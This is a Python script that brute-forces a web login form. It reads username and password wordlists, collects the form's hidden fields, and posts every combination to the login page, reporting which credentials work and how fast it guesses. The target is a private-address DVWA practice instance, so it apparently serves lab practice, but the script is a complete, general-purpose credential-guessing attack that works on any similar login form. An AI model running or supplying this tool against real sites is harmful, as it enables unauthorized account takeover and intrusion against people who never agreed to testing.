import requests
from bs4 import BeautifulSoup
import time

def hydra_attack(target_url, login_url, form_data, username_file, password_file):
    # Load username and password dictionaries
    with open(username_file, 'r') as user_file:
        usernames = user_file.read().splitlines()

    with open(password_file, 'r') as pass_file:
        passwords = pass_file.read().splitlines()

    # Session to persist cookies across requests
    session = requests.Session()

    # Initial GET request to get the login form and any necessary cookies
    response = session.get(target_url + login_url)
    soup = BeautifulSoup(response.text, 'html.parser')

    # Extract form parameters
    form_params = {}
    for input_tag in soup.find_all('input'):
        if 'name' in input_tag.attrs and 'value' in input_tag.attrs:
            form_params[input_tag['name']] = input_tag['value']

    # Perform the brute-force attack
    start_time = time.time()  # Record the start time of the attack
    count = 0
    successful_logins = []

    for username in usernames:
        for password in passwords:
            # Update form parameters with current username and password
            form_params['username'] = username
            form_params['password'] = password

            # POST request to submit the login form
            response = session.post(target_url + login_url, data=form_params)

            # Check if login was successful based on the response content
            if 'login failed' not in response.text.lower():
                print(f"Successful login for {username}:{password}")
                successful_logins.append(f"{username}:{password}")

            count += 1

    # Calculate average passwords per second and display
    elapsed_time = time.time() - start_time
    passwords_per_second_rate = count / elapsed_time
    print(f"Tried {count} passwords. Passwords per second: {passwords_per_second_rate:.2f}")

    # Print the ending timestamp
    end_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    print(f"Attack stopped at: {end_time}")

    # Print all successful logins
    if successful_logins:
        print("\nAll Successful Logins:")
        for login in successful_logins:
            print(login)

if __name__ == "__main__":
    target_url = "http://192.168.67.135"
    login_url = "/dvwa/login.php"
    form_data = {"Login": "submit"}
    username_file = "user.txt"
    password_file = "pass.txt"

    hydra_attack(target_url, login_url, form_data, username_file, password_file)
